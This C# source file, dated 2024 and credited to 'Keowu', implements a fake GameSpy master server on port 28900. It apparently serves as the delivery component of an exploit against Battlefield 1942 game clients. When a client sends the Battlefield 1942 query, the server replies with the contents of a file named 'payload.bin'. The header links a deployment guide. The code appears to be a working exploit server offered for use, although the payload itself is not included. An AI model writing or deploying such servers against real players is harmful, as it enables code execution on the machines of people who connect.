/*
 *  To deploy for Linux x64 -> https://www.youtube.com/watch?v=V0xBxA6a-MI
 * 
 *   (C) Keowu - 2024
*/
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Text;

namespace GamespyMasterServerTCP {

    class Program {

        private static Socket _socket;
        private const int Port = 28900;
        private static byte[] fileBytes;

        static async Task Main(string[] args) {

            _socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp) {

                SendTimeout = 1000,
                ReceiveTimeout = 1000,
                SendBufferSize = 65535,
                ReceiveBufferSize = 65535,
                ExclusiveAddressUse = true,
                LingerState = new LingerOption(false, 0)

            };

            var endPoint = new IPEndPoint(IPAddress.Any, Port);
            _socket.Bind(endPoint);
            _socket.Listen(10);
           
            Console.WriteLine("Gamespy keowu v1.1.4");
            Console.WriteLine($"Server is listening on port {Port}");

            while (true) {

                try {

                    var clientSocket = await _socket.AcceptAsync();

                    Task.Run(() => HandleClient(clientSocket));

                }
                catch (Exception ex) {

                    Console.WriteLine($"Error: {ex.Message}");

                }
            }
        }

        static async Task HandleClient(Socket clientSocket) {

            try {

                fileBytes = File.ReadAllBytes(Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "payload.bin"));

                byte[] helloMessage = Encoding.UTF8.GetBytes("\\basic\\secure\\MASTER");
                await clientSocket.SendAsync(new ArraySegment<byte>(helloMessage), SocketFlags.None);

                var buffer = new byte[65535];
                while (true) {

                    var receivedBytes = await clientSocket.ReceiveAsync(new ArraySegment<byte>(buffer), SocketFlags.None);

                    if (receivedBytes == 0) {
                    
                        Console.WriteLine($"Client {clientSocket.RemoteEndPoint} disconnected.");

                        break;
                    }

                    var receivedMessage = Encoding.UTF8.GetString(buffer, 0, receivedBytes);

                    if (receivedMessage.Contains("bfield1942\\final")) {

                        await clientSocket.SendAsync(new ArraySegment<byte>(fileBytes), SocketFlags.None);

                    }
                }
            }
            catch (Exception ex) {

                Console.WriteLine($"Error: {ex.Message}");

            }
            finally {

                clientSocket.Close();

            }
        }
    }
}
